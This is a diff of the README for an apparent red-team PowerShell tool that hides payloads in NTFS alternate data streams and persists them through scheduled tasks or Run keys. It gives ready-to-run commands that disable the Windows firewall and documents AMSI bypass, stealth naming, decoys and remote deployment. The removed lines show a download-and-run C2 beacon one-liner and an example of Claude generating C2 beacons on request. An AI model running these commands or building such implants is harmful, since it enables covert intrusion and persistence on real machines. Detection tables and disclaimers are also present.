@@ -14,320 +14,200 @@
     . .      . .. .. . ... .................. .. . .. .      . .
 ```
 
-If on linux, use the following to see some ASCII art:
+**ADS hides, persists, and executes arbitrary PowerShell payloads inside NTFS Alternate Data Streams. The aim was to provide PoC for research into novel red team ideas on Windows, and it turned into a bit more than that.**
+
+Current version: **v2.4** | [Quick-Start Guide](QUICK-START.md)
+
+---
+
+## What Do I Type?
+
+Three canonical examples. Copy, modify the payload, run on Kali.
+
+```bash
+# 1. Fastest possible — firewall down, default Advanced stealth, task persistence
+pwsh src/ADS-OneLiner.ps1 \
+  -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
+  -OutputFile /tmp/fw-off.txt
+
+# 2. Standard CCDC op — Advanced stealth, registry persist, 3 redundant instances
+pwsh src/ADS-OneLiner.ps1 \
+  -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
+  -Obfuscate Advanced \
+  -Persist registry \
+  -InstanceCount 3 \
+  -OutputFile /tmp/fw-registry.txt
+
+# 3. Max stealth — encrypted + Paranoid tier + deep placement
+pwsh src/ADS-OneLiner.ps1 \
+  -PayloadFile /tmp/mypayload.ps1 \
+  -Obfuscate Paranoid \
+  -Encrypt \
+  -OutputFile /tmp/paranoid.txt
 ```
-echo -e "\033[34m. : .  .  .. \033[36m... ...... ..................... ...... ... ..\033[34m .  . : .\n: .   .       .       \033[36m.        .        .        .\033[34m       .   . . :\n.       \033[36m_    ___   \033[96m___   _      ___    ___ _____  _    \033[36m___  _  _       \033[34m.\n       \033[36m/_\   | _ \| \033[97m_ \ /_\    | __ \ |_ _|_   _|| | \033[36m/ _ \| \| |\n      \033[36m/ _ \  |  _/| \033[97m _// _ \   | |/ /  | |  | |  | || \033[36m(_) | .\` |\n     \033[36m/_/ \_\ |_|  \033[97m|_/ /_/ \_\  |_|\_| |___| |_|  |_| \033[36m\___/|_|\_|\n\033[34m: .    . .   \033[36m. . ..  . .. . . .. . .. .. . .. ... . .. .\033[34m    . . :\n.   .  .     \033[36m. :     .    :  . : :   . : :    . :      .\033[34m    .   .\n   .   :      \033[36m'  \033[96mApparition Delivery System (ADS)\033[36m '      \033[34m:    .\n .  .  .   . . \033[36m' \033[96m\" Execution without presence \"\033[36m '\033[34m .    .   .  .\n    . .      . .. .. . ... .................. .. . .. .      . .\033[0m"
+
+Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file into PowerShell as Administrator.
+
+---
+
+## Quick-Reference: All Options
+
+### ADS-OneLiner.ps1 (run on Kali — generates the one-liner)
+
+| Parameter | Type | Default | Description |
+|-----------|------|---------|-------------|
+| **Payload Input** | | | |
+| `-Payload 'cmd'` | string | — | Inline PowerShell. Use single quotes in bash. |
+| `-PayloadFile /path` | string | — | Read payload from file. Best for `$variables`. |
+| `-PayloadAtDeployment` | switch | off | Prompt for payload on Windows target at paste time. |
+| **Stealth Tier** | | | |
+| `-Obfuscate None\|Basic\|Advanced\|Paranoid` | string | `Advanced` | See tier table below. |
+| **Persistence** | | | |
+| `-Persist task\|registry\|none` | string | `task` | How the payload re-triggers. |
+| `-Trigger AtLogOn,AtStartup,OnIdle,OnUnlock` | string[] | `AtLogOn,AtStartup` | When the task fires. Multiple allowed. |
+| `-PeriodicMinutes N` | int 1–1440 | `5` | Periodic task interval in minutes. |
+| `-JitterPercent N` | int 0–50 | `20` | Randomize timing by ±N% of interval. |
+| `-InstanceCount N` | int 1–20 | `1` | Deploy N independent copies with unique names/paths. |
+| **Evasion** | | | |
+| `-Encrypt` | switch | off | DPAPI machine-bound encrypt payload. |
+| `-UseCompression $true\|$false` | bool | `$true` | DeflateStream compression (~50% smaller). |
+| `-Randomize $true\|$false` | bool | tier-implied | Randomize all artifact names. |
+| `-UseDeepPlacement $true\|$false` | bool | tier-implied | Bury ADS in WER/Cache dirs. |
+| `-AttachToExisting $true\|$false` | bool | tier-implied | Attach to existing system file. |
+| `-NoAmsi` | switch | off | Disable AMSI bypass (almost never use). |
+| **Stream Naming** | | | |
+| `-ZeroWidthStreams` | switch | tier-implied | ZW Unicode chars in stream names. |
+| `-ZeroWidthMode single\|multi\|hybrid` | string | `single` | ZW character pattern. |
+| `-HybridPrefix name` | string | — | Visible prefix for hybrid mode (e.g., `Zone.Identifier`). |
+| `-CreateDecoys N` | int 0–10 | `0` | Create N benign decoy ADS streams. |
+| **Output** | | | |
+| `-OutputFile path` | string | `ads-payload.txt` | Where to save the generated deployment file. |
+| `-ManifestDir path` | string | `./manifests` | Where to save the cleanup manifest. |
+
+### ADS-Dropper.ps1 (run on Windows — direct deployment or -GenerateOnly)
+
+All OneLiner parameters above, plus:
+
+| Parameter | Type | Default | Description |
+|-----------|------|---------|-------------|
+| `-Targets host[]` | string[] | `localhost` | Remote target hosts (WinRM). |
+| `-Credential cred` | PSCredential | — | Credentials for remote deployment. |
+| `-NoExec` | switch | off | Stage artifacts without executing. |
+| `-ManifestPath path` | string | — | Path to save cleanup manifest. |
+| `-GenerateOnly` | switch | off | Print config object without creating artifacts (Linux). |
+| `-PayloadAtRuntime` | switch | off | Prompt for payload on Windows at runtime. |
+| `-Help` | switch | — | Show full inline help. |
+
+---
+
+## Stealth Tier Guide
+
+The `-Obfuscate` parameter is the primary control. Most other evasion parameters are implied by the tier.
+
+| Tier | Task/File Names | ADS Placement | ZW Streams | Implied Settings | When to Use |
+|------|-----------------|---------------|------------|-----------------|-------------|
+| `None` | Fixed: `SystemOptimization`, `SystemCache.dat` | `C:\ProgramData\` | No | — | **Testing only. Never in competition.** |
+| `Basic` | Word-list random | `C:\ProgramData\` | No | — | Quick deployment, acceptable stealth. |
+| `Advanced` | Word-list random | WER\Cache, Diagnosis | No | Randomize + DeepPlace + Attach | **Default. Standard CCDC.** |
+| `Paranoid` | Word-list random | WER\Cache + attach | Yes | All Advanced + ZeroWidth | Max stealth. Harder to clean up. |
+
+**Override example** (Advanced stealth but disable deep placement):
+```bash
+pwsh src/ADS-OneLiner.ps1 -Payload 'cmd' -Obfuscate Advanced -UseDeepPlacement $false
 ```
-
----
-
-## Note: This tool passed some manual execution checks in controlled VMs; it has not been tested for automation, in the wild, or for long-term reliability. Task persistence works for more complex payloads. Encrypt didn't work last check. Need better scheduled task names and option for manual set for the task name. Registry persistence was having issues last tested. I welcome fixes/improvements. Thank you for looking!
-
----
-
-## Purpose
-ADS (Apparition Delivery System) is a research framework for exploring stealthy 
-Windows execution techniques that exist, execute, and persist outside traditional visibility.
-
-**Primary Use Cases:**
-1. Red Team: CCDC-style persistence testing (authorized environments only)
-2. Blue Team: Understanding ADS detection gaps and telemetry
-3. Research: Novel NTFS hiding techniques and their forensic visibility
-
----
-
-## Ethical Guidelines
-✅ Authorized penetration testing with explicit permission
-✅ CCDC competition (adversary emulation)
-✅ Security research and detection development
-❌ Unauthorized access to systems
-❌ Malicious use
 
 ---
 
 ## Architecture
+
 ```
-[Payload] → [Storage] → [Loader] → [Trigger]
+[Kali]  ADS-OneLiner.ps1  →  deployment one-liner (base64)
+          |
+          | paste on Windows
+          v
+[Target] ADS-Dropper.ps1  →  [ADS payload]  ←  NTFS stream (invisible to dir/ls)
+                          →  [JScript wrapper]  (wscript.exe → no PS window)
+                          →  [Task Scheduler] or [Registry Run key]
 ```
 
-**Storage Backends:**
-| Type           | Visibility | Stability        | Use Case                     |
-|----------------|------------|------------------|------------------------------|
-| Classic ADS    | Medium     | High             | Production red team          |
-| Volume Root    | Low        | High             | Enumeration evasion research |
-| NTFS Internal* | Very Low   | **Experimental** | Research only                |
-
-### *NTFS Internal streams (e.g., $LOGGED_UTILITY_STREAM) are **unstable** and may cause filesystem corruption. Use only in disposable VMs.
+**Two-script architecture:**
+- `src/ADS-OneLiner.ps1` — Runs on Linux/Kali. Generates minimal deployment commands. No file uploads needed.
+- `src/ADS-Dropper.ps1` — Runs on Windows. All business logic: ADS creation, encryption, persistence, cleanup.
 
 ---
 
-## 🚀 Quickstart
+## Persistence Methods
 
-### **v2.2.4 Workflow: Generate on Linux, Deploy on Windows**
+### Task Persistence (`-Persist task`)
+- Requires admin
+- Creates a JScript wrapper (`wscript.exe //B file.js`) — no visible PowerShell window
+- Fires on: configured `-Trigger` events + periodic every `-PeriodicMinutes` minutes
+- Task name randomized from plausible word lists (Advanced/Paranoid tier)
 
-The recommended workflow uses **ADS-OneLiner.ps1** to generate minimal payloads on your attacker machine:
-
-#### **On Linux (Kali):**
-```bash
-# Generate encrypted payload with stealth features
-pwsh ./src/ADS-OneLiner.ps1 \
-  -Payload "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')" \
-  -Encrypt \
-  -Randomize \
-  -ZeroWidthStreams \
-  -CreateDecoys 3 \
-  -OutputFile payload.txt
-
-# Manifest saved to ./manifests/ for recovery
-```
-
-#### **On Windows Target:**
-```powershell
-# Copy OPTION 1 from payload.txt and paste:
-powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64_here>
-
-# Done! No file uploads needed.
-```
-
-### **Alternative: Direct Deployment (v1.0 method)**
-
-For local testing or when you have filesystem access:
-```powershell
-# Upload ADS-Dropper.ps1 to target, then run:
-.\ADS-Dropper.ps1 -Payload $payload -Persist task -Encrypt -Randomize
-```
+### Registry Persistence (`-Persist registry`)
+- Works as user or admin
+- Sets `HKCU:\...\Run` (and `HKLM:\...\Run` if admin)
+- Fires in the user's logon session — interactive payloads (memes, UI effects) work here
+- Companion scheduled task handles periodic re-trigger
 
 ---
 
-## 🎯 Key Features
+## Session Context: Interactive vs. SYSTEM
 
-### **Two-Script Architecture**
-- **ADS-Dropper.ps1**: Core engine (runs on Linux OR Windows)
-- **ADS-OneLiner.ps1**: Command generator (Linux only, generates Windows payloads)
+Tasks run as `NT AUTHORITY\SYSTEM` (Session 0). Payloads that open windows, play audio, or access the clipboard need a **user session**.
 
-### **Deployment Methods**
-1. **Generate-and-Paste** (v2.0) - No file uploads, minimal footprint
-2. **Upload-and-Execute** (v1.0) - Traditional method, still supported
+| Context | Use `-Persist task` | Use `-Persist registry` |
+|---------|--------------------|-----------------------|
+| SYSTEM (Session 0) | Firewall, registry, files, services, credential dump | — |
+| User session | `-Trigger AtLogOn` or `OnUnlock` | Always user session |
+| Interactive UI (memes, desktop effects) | Use `-Trigger AtLogOn` only | Preferred |
 
-### **LLM Integration**
-Could easily be added to tool calls and manifest output routed to payload tracking:
-```
-User: "Generate an encrypted C2 beacon for 10.0.0.50"
-Claude: [runs ADS-OneLiner.ps1, returns base64 one-liner]
-Manifest: Routed to LLM for payload recovery/tracking
-User: [pastes on Windows target]
-```
-
-### `-ZeroWidthStreams`
-
-Enable zero-width Unicode characters in stream names for enhanced stealth.
-
-Example:
-```powershell
--ZeroWidthStreams
-```
-
-**How it works:**
-- Uses invisible Unicode characters (U+200B, U+200C, U+FEFF, etc.)
-- Stream names appear blank or truncated in most tools
-- Bypasses simple string-based detection
+**Rule:** For anything that needs to be visible to a human (memes, popups, audio), use `-Persist registry`.
 
 ---
 
-### `-ZeroWidthMode`
+## Detection Surface
 
-Specifies how zero-width characters are used.  
-Options: `single`, `multi`, `hybrid`  
-Default: `single`
+| Technique | Detection Vector |
+|-----------|-----------------|
+| ADS creation | Sysmon Event 15 (FileCreateStreamHash). `dir /r` in cmd shows stream sizes. |
+| Scheduled task | Event ID 4698 (Task Created). `Get-ScheduledTask` shows obfuscated name. |
+| Registry Run key | Event ID 4657 (Registry Modification). Standard auditing. |
+| JScript execution | `wscript.exe` in process tree. No PowerShell window. |
+| AMSI bypass | XOR byte array in deployment script — fragmented so no contiguous string. |
+| Payload at runtime | Compressed + base64. No plaintext payload on disk. |
 
-**Modes:**
-
-1. **single** - One zero-width character
-```powershell
-   -ZeroWidthStreams -ZeroWidthMode single
-   # Stream: [invisible character]
-```
-
-2. **multi** - Multiple zero-width characters
-```powershell
-   -ZeroWidthStreams -ZeroWidthMode multi
-   # Stream: [3-5 invisible characters]
-```
-
-3. **hybrid** - Legitimate prefix + zero-width suffix
-```powershell
-   -ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix "Zone.Identifier"
-   # Stream: Zone.Identifier[invisible character]
-```
+**MITRE ATT&CK:** T1564.004 (ADS) | T1053.005 (Scheduled Task) | T1547.001 (Registry Run Keys)
 
 ---
 
-### `-HybridPrefix`
+## References & Credits
 
-Legitimate stream name to use as prefix in hybrid mode.
-
-Common prefixes:
-- `Zone.Identifier` (most common, created by browser downloads)
-- `Summary` (document metadata)
-- `Comments` (user annotations)
-
-Example:
-```powershell
--ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix "Zone.Identifier"
-```
+- Oddvar Moe — ADS execution techniques: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
+- Enigma0x3 — ADS persistence: https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/
+- MITRE ATT&CK T1564.004: https://attack.mitre.org/techniques/T1564/004/
+- NTFS streams: https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams
 
 ---
 
-### `-CreateDecoys`
+## See Also
 
-Number of benign decoy streams to create (0-10).
-
-Creates legitimate-looking streams to obscure the real payload:
-- `Zone.Identifier` - Download zone information
-- `Summary` - Document summary
-- `Comments` - File comments
-- `Author` - Author metadata
-
-Example:
-```powershell
--CreateDecoys 3
-```
-
-**OPSEC Note:** Decoys add noise but increase forensic complexity.
-
-### Multi-Target Deployment
-```powershell
-# Deploy to multiple targets (experimental)
-.\src\ADS-Dropper.ps1 -Payload $payload -Targets @('dc01','web01','app01') -Encrypt -ZeroWidthStreams
-```
-### Cleanup Operations
-```powershell
-# List all ADS with byte-level details
-.\src\ADS-Dropper.ps1 -CleanupMode list
-
-# Safe removal with confirmation
-.\defense\Cleanup-ZeroWidthADS.ps1 -File "C:\ProgramData\system.dll" -StreamBytes "0x0B 0x20" -WhatIf
-```
+- [QUICK-START.md](QUICK-START.md) — Full parameter reference, scenario cookbook, bash escaping guide
+- [docs/tests/COMPREHENSIVE-TEST-SUITE.md](docs/tests/COMPREHENSIVE-TEST-SUITE.md) — Full VM validation test suite
+- [defense/](defense/) — Blue team detection scripts
 
 ---
 
-## 📚 Full Command Reference
-### ADS-Dropper.ps1
-.\src\ADS-Dropper.ps1 `
-    -Payload <string|scriptblock|filepath> `
-    [-Targets <string[]>] `
-    [-Persist <task|registry|wmi>] `
-    [-Randomize] `
-    [-Encrypt] `
-    [-ZeroWidthStreams] `
-    [-ZeroWidthMode <single|multi|hybrid>] `
-    [-HybridPrefix <string>] `
-    [-CreateDecoys <int>] `
-    [-ManifestStorage <file|registry|both|none>] `
-    [-NoExec] `
-    [-CleanupMode <none|list|remove>] `
-    [-Credential <PSCredential>]
+## License & Disclaimer
 
-#### Parameters:
-#### Parameter
-#### Type
-#### Description
-#### Default
-Payload
-string/scriptblock
-Payload to deploy
-Required
-Targets
-string[]
-Target hostnames
-localhost
-Persist
-string[]
-Persistence methods
-task
-Randomize
-switch
-Randomize file/stream names
-False
-Encrypt
-switch
-AES-256 encrypt payload
-False
-ZeroWidthStreams
-switch
-Use zero-width Unicode
-False
-ZeroWidthMode
-string
-single, multi, or hybrid
-single
-HybridPrefix
-string
-Prefix for hybrid mode
-Auto-selected
-CreateDecoys
-int
-Number of decoy streams (0-10)
-0
-ManifestStorage
-string
-Manifest backend
-file
-NoExec
-switch
-Deploy without executing
-False
-CleanupMode
-string
-Cleanup operation
-none
+For authorized security testing, CCDC competition, and security research only.
 
+Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical. The author assumes no liability for misuse.
+
+By using this tool you agree to: obtain explicit permission before testing, follow responsible disclosure practices, and provide detection guidance to defenders when appropriate.
 
 ---
 
-## Detection Tools Provided
-Located in /defense directory
-
----
-
-## 📖 References & Credits
-### Core Research
-- Oddvar Moe - ADS Execution (https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
-- Enigma0x3 - ADS Persistence (https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/)
-- MITRE ATT&CK T1564.004 (https://attack.mitre.org/techniques/T1564/004/)
-### Unicode & NTFS
-- Unicode Zero-Width Characters (https://www.unicode.org/charts/)
-- Microsoft NTFS Documentation (https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams)
-### Tools
-- Sysinternals Streams
-- Sysmon
-
----
-
-## ⚖️ License & Disclaimer
-### Educational and Defensive Use Only
-### This tool is provided for:
-- Authorized security testing
-- Educational purposes
-- Detection research
-- Blue team training
-Unauthorized use is illegal and unethical. The author assumes no liability for misuse.
-### By using this tool, you agree to:
-- Only use in authorized environments
-- Obtain explicit written permission before testing
-- Follow responsible disclosure practices
-- Provide detection guidance to defenders
-
----
-
-## 📞 Contact & Support
-- Author: Qweary
-- Email: qwearyblog@gmail.com
-- LinkedIn: https://www.linkedin.com/in/louis-piano-099826b2
-- Blog: https://qweary.github.io
-Found a bug? Open an issue on GitHub Have questions? Email or LinkedIn message Want to contribute? Pull requests welcome!
-
----
-
-"Execution without presence" 👻
+*"Execution without presence"*
 © 2026 Qweary — Security Research With Purpose
+Contact: qwearyblog@gmail.com | https://qweary.github.io | https://github.com/Qweary
